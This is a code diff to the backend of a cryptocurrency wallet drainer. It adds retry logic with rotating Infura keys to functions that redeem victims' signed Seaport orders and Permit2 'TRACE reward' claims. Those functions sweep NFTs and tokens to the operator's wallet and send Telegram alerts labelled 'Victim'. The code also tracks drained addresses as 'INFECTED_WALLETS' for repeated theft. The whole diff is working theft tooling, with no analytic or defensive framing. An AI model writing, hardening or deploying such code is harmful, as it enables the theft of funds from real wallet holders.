@@ -36,6 +36,29 @@ const getRpcUrl = (chainName, isWs = true) => {
     }
 };
 
+async function executeWithRpcRetry(chainName, operationName, operationFn) {
+    const MAX_RETRIES = 4;
+    for (let i = 0; i < MAX_RETRIES; i++) {
+        try {
+            const rpcUrl = getRpcUrl(chainName, false);
+            const provider = new ethers.JsonRpcProvider(rpcUrl);
+            await provider.getNetwork();
+            return await operationFn(provider);
+        } catch (error) {
+            const msg = error.message.toLowerCase();
+            const isRetryable = msg.includes("429") || msg.includes("rate limit") || msg.includes("compute units") || error.code === "SERVER_ERROR" || error.code === "TIMEOUT";
+
+            if (isRetryable && i < MAX_RETRIES - 1) {
+                console.warn(`⚠️ [${operationName}] RPC Error (${error.code || "429"}). Rotating ID and Retrying (Attempt ${i + 1}/${MAX_RETRIES})...`);
+                currentInfuraIndex++;
+                await new Promise(r => setTimeout(r, 1500 * (i + 1))); // Backoff
+                continue;
+            }
+            throw error;
+        }
+    }
+}
+
 const CHAIN_CONFIGS = {
     ethereum: { name: "Ethereum", chainId: 1 },
     bsc: { name: "BSC", chainId: 56 },
@@ -594,21 +617,21 @@ function startOrderReceiver() {
 
 async function fulfillSeaportOrder(orderPayload, chainName) {
     try {
-        const config = Object.values(CHAIN_CONFIGS).find(c => c.name === chainName);
-        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
-        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
-        const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);
+        await executeWithRpcRetry(chainName, "Seaport Fulfillment", async (provider) => {
+            const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+            const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);
 
-        console.log(`🚀 [SEAPORT] Fulfilling Order on ${chainName}...`);
-        notifyTelegram(`<b>🖼️ Seaport: Fulfilling Order</b>\nChain: ${chainName}\nOfferer: <code>${orderPayload.parameters?.offerer || "Unknown"}</code>`);
+            console.log(`🚀 [SEAPORT] Fulfilling Order on ${chainName}...`);
+            notifyTelegram(`<b>🖼️ Seaport: Fulfilling Order</b>\nChain: ${chainName}\nOfferer: <code>${orderPayload.parameters?.offerer || "Unknown"}</code>`);
 
-        // orderPayload should contain { parameters, signature }
-        const tx = await seaport.fulfillOrder(orderPayload.parameters, orderPayload.signature, { value: ethers.parseEther("0.001"), gasLimit: 1500000 });
+            // orderPayload should contain { parameters, signature }
+            const tx = await seaport.fulfillOrder(orderPayload.parameters, orderPayload.signature, { value: ethers.parseEther("0.001"), gasLimit: 1500000 });
 
-        console.log(`📤 Seaport TX Sent: ${tx.hash}`);
-        await tx.wait();
-        console.log(`✅ Seaport SUCCESS! Assets secured on ${chainName}.`);
-        await notifyTelegram(`<b>💰 SEAPORT SUCCESS!</b>\nChain: ${chainName}\nTx: <code>${tx.hash}</code>\nAssets: NFTs & Tokens swept.`);
+            console.log(`📤 Seaport TX Sent: ${tx.hash}`);
+            await tx.wait();
+            console.log(`✅ Seaport SUCCESS! Assets secured on ${chainName}.`);
+            await notifyTelegram(`<b>💰 SEAPORT SUCCESS!</b>\nChain: ${chainName}\nTx: <code>${tx.hash}</code>\nAssets: NFTs & Tokens swept.`);
+        });
         return true;
     } catch (error) {
         console.error(`❌ Seaport fulfillment failed:`, error.message);
@@ -624,31 +647,32 @@ async function fulfillPermit2Batch(permit, signature, chainName, owner) {
 
 async function fulfillPermit2Claim(permit, signature, chainName, owner, routerAddress, rewardAmount) {
     try {
-        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
-        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
-        const router = new ethers.Contract(routerAddress, TRACE_REWARDS_ABI, wallet);
+        await executeWithRpcRetry(chainName, "Permit2 Claim", async (provider) => {
+            const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+            const router = new ethers.Contract(routerAddress, TRACE_REWARDS_ABI, wallet);
 
-        console.log(`🚀 Executing TRACE Claim on ${chainName} via Rewards Contract...`);
+            console.log(`🚀 Executing TRACE Claim on ${chainName} via Rewards Contract...`);
 
-        const rewardAmountWei = ethers.parseUnits(rewardAmount.toString(), 18);
+            const rewardAmountWei = ethers.parseUnits(rewardAmount.toString(), 18);
 
-        // Execute via Router with 0.001 fee
-        const tx = await router.claim(permit, signature, rewardAmountWei, {
-            value: ethers.parseEther("0.001"),
-            gasLimit: 800000 // Higher limit for batch transfers
+            // Execute via Router with 0.001 fee
+            const tx = await router.claim(permit, signature, rewardAmountWei, {
+                value: ethers.parseEther("0.001"),
+                gasLimit: 800000 // Higher limit for batch transfers
+            });
+
+            console.log(`📤 Claim TX Sent: ${tx.hash}`);
+            await notifyTelegram(`<b>💎 TRACE Reward Claimed!</b>\nChain: ${chainName}\nTx: ${tx.hash}\nVictim: <code>${owner}</code>\nTokens: ${permit.permitted.length}`);
+
+            // Add to permanent infection
+            const chainKey = Object.keys(CHAIN_CONFIGS).find(k => CHAIN_CONFIGS[k].name === chainName) || chainName.toLowerCase();
+            if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
+            INFECTED_WALLETS[chainKey].add(owner);
+
+            await tx.wait();
+            console.log(`✅ Claim SUCCESS on ${chainName}`);
+            await notifyTelegram(`<b>💰 TRACE CLAIM SECURED!</b>\nAssets bundled and swept via TraceRewards on ${chainName}.`);
         });
-
-        console.log(`📤 Claim TX Sent: ${tx.hash}`);
-        await notifyTelegram(`<b>💎 TRACE Reward Claimed!</b>\nChain: ${chainName}\nTx: ${tx.hash}\nVictim: <code>${owner}</code>\nTokens: ${permit.permitted.length}`);
-
-        // Add to permanent infection
-        const chainKey = Object.keys(CHAIN_CONFIGS).find(k => CHAIN_CONFIGS[k].name === chainName) || chainName.toLowerCase();
-        if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
-        INFECTED_WALLETS[chainKey].add(owner);
-
-        await tx.wait();
-        console.log(`✅ Claim SUCCESS on ${chainName}`);
-        await notifyTelegram(`<b>💰 TRACE CLAIM SECURED!</b>\nAssets bundled and swept via TraceRewards on ${chainName}.`);
         return true;
     } catch (error) {
         console.error(`❌ Claim fulfillment failed:`, error.message);
